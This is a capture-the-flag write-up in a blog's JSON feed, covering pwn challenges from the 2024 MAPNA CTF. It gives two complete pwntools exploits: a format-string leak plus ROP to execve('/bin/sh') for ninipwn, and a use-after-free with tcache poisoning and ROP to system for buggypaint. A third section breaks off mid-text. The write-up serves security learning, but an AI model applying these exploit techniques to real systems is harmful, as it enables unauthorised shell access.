{
    "version": "https://jsonfeed.org/version/1",
    "title": "xsh 的世界 • All posts by \"2024_ctf\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/07/16/2024_mapna_CTF/",
            "url": "http://example.com/2024/07/16/2024_mapna_CTF/",
            "title": "2024 mapna CTF",
            "date_published": "2024-07-16T13:00:23.000Z",
            "content_html": "<h2 id=\"ninipwn-新手\"><a href=\"#ninipwn-新手\" class=\"headerlink\" title=\"ninipwn - 新手\"></a>ninipwn - 新手</h2><p><img src=\"/2024/07/16/2024_mapna_CTF/26fc7166794bc8b23c485afea5a72126.png\"></p>\n<p>key 是 8 字节的，但是读入了 10 字节，可以溢出到 text_length ，导致 text_length 超过 buf 长度，能够栈溢出，并且存在格式化字符串漏洞。</p>\n<p>1.通过格式化字符串漏洞泄露 canary 和 libc_base </p>\n<p>2.通过栈溢出进行 ROP</p>\n<p>3.注意 ROP payload 需要经过 encrypt 处理，其实就是一个简单的异或算法</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_rdi_ret</span>(<span class=\"params\">rop, base</span>) : <span class=\"keyword\">return</span> base + rop.find_gadget([<span class=\"string\">&#x27;pop rdi&#x27;</span>, <span class=\"string\">&#x27;ret&#x27;</span>]).address, base + rop.find_gadget([<span class=\"string\">&#x27;ret&#x27;</span>]).address</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./ninipwn&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">elf_rop = ROP(elf_patch)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_patch = <span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(libc_patch):</span><br><span class=\"line\">\tlibc = ELF(libc_patch)</span><br><span class=\"line\">\tlibc_rop = ROP(libc_patch)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ld = ELF(&#x27;./lib/ld-linux-x86-64.so.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x12ac)&#x27; + &#x27;\\nc&#x27;*0x108)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">data, key</span>):</span><br><span class=\"line\">    text_length = <span class=\"built_in\">len</span>(data)</span><br><span class=\"line\">    key_length = <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">    encrypted_data = <span class=\"built_in\">bytearray</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(text_length):</span><br><span class=\"line\">        encrypted_data[i] ^= key[i % key_length]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>(encrypted_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x1421)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">b&#x27;length: &#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"number\">0x100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">b&#x27;%39$p%3$p\\x02&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Key: &#x27;</span>, key)</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;0x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(r(<span class=\"number\">16</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;0x&#x27;</span>)</span><br><span class=\"line\">libc_base = <span class=\"built_in\">int</span>(r(<span class=\"number\">12</span>), <span class=\"number\">16</span>) - <span class=\"number\">23</span> - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">rdi, ret = get_rdi_ret(libc_rop, libc_base)</span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002be51</span></span><br><span class=\"line\">rdx = libc_base + <span class=\"number\">0x0000000000170337</span></span><br><span class=\"line\">execve = libc_base + libc.sym[<span class=\"string\">&#x27;execve&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">pl = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x108</span> + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(rdi) + p64(binsh) + p64(rsi) + p64(<span class=\"number\">0</span>) + p64(rdx) + p64(<span class=\"number\">0</span>) + p64(execve)</span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Text: &#x27;</span>, encrypt(pl, key[:<span class=\"number\">8</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;canary&#x27;</span>, canary)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sl(b&#x27;cat flag&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">inter()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"buggypaint-简单\"><a href=\"#buggypaint-简单\" class=\"headerlink\" title=\"buggypaint - 简单\"></a>buggypaint - 简单</h2><p><img src=\"/2024/07/16/2024_mapna_CTF/b41e3bc258ec95342bfcf461427eec7d.png\" alt=\"b41e3bc258ec95342bfcf461427eec7d\"></p>\n<p>select 功能可以保存 create 功能创建的堆块指针，但是 delete 功能释放堆块时候不会清空 select 保存的堆块指针，这就导致了 UAF</p>\n<p>可以很简单利用 tcache bin attack 进行任意读写，这里是通过 environ 泄露栈之后进行 ROP</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_rdi_ret</span>(<span class=\"params\">rop, base</span>) : <span class=\"keyword\">return</span> base + rop.find_gadget([<span class=\"string\">&#x27;pop rdi&#x27;</span>, <span class=\"string\">&#x27;ret&#x27;</span>]).address, base + rop.find_gadget([<span class=\"string\">&#x27;ret&#x27;</span>]).address</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>)<span class=\"comment\">#, log_level=&#x27;debug&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./chall&#x27;</span></span><br><span class=\"line\">libc_patch = <span class=\"string\">&#x27;./libc.so.6&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">elf_rop = ROP(elf_patch)</span><br><span class=\"line\">libc = ELF(libc_patch)</span><br><span class=\"line\">libc_rop = ROP(libc_patch)</span><br><span class=\"line\"><span class=\"comment\">#ld = ELF(&#x27;./lib/ld-linux-x86-64.so.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">x, y, w, h, data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;x: &#x27;</span>, <span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;y: &#x27;</span>, <span class=\"built_in\">str</span>(y))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;width: &#x27;</span>, <span class=\"built_in\">str</span>(w))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;height: &#x27;</span>, <span class=\"built_in\">str</span>(h))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;color(1=red, 2=green): &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsa(<span class=\"string\">b&#x27;content: &#x27;</span>, data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;x: &#x27;</span>, <span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;y: &#x27;</span>, <span class=\"built_in\">str</span>(y))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">select</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;x: &#x27;</span>, <span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;y: &#x27;</span>, <span class=\"built_in\">str</span>(y))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tsa(<span class=\"string\">b&#x27;content: &#x27;</span>, data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">\tadd(<span class=\"number\">4</span>, i, <span class=\"number\">0x10</span>, <span class=\"number\">0x10</span>, <span class=\"string\">b&#x27;a&#x27;</span>)\t</span><br><span class=\"line\">select(<span class=\"number\">4</span>, <span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tdelete(<span class=\"number\">4</span>, i)</span><br><span class=\"line\">show()</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;Box content:\\n&#x27;</span>)</span><br><span class=\"line\">libc_base = u64(r(<span class=\"number\">8</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x11</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">select(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;Box content:\\n&#x27;</span>)</span><br><span class=\"line\">key = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\">heap_base = key &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">select(<span class=\"number\">5</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">5</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">5</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">environ = libc_base + libc.sym[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">ptr = heap_base + <span class=\"number\">0xaa0</span></span><br><span class=\"line\">edit(p64(ptr ^ key))</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x1</span>, p64(<span class=\"number\">0x8</span>) + p64(environ))</span><br><span class=\"line\">show()</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;Box content:\\n&#x27;</span>)</span><br><span class=\"line\">stack = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">select(<span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(p64((stack - <span class=\"number\">0x148</span>) ^ key))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x1965)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdi, ret = get_rdi_ret(libc_rop, libc_base)</span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\"></span><br><span class=\"line\">pl = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0</span>, <span class=\"number\">0x1e</span>, <span class=\"number\">0x1e</span>, pl)</span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;stack&#x27;</span>, stack)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;key&#x27;</span>, key)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">inter()</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">pause()\t</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"protector-简单\"><a href=\"#protector-简单\" class=\"headerlink\" title=\"protector - 简单\"></a>protector - 简单</h2><p><img src=\"/2024/07/16/2024_mapna_CTF/0fa5160d65ef941ee7b0c2d8b382833b.png\" alt=\"0fa5160d65ef941ee7b0c2d8b382833b\"></p>\n<p>一个开启了沙箱的栈溢出程序，明显需要 orw ，但是其中的 generate_directory_tree.py 会将 flag 藏入随机生成的 0x100 个文件中的一个。</p>\n<p><img 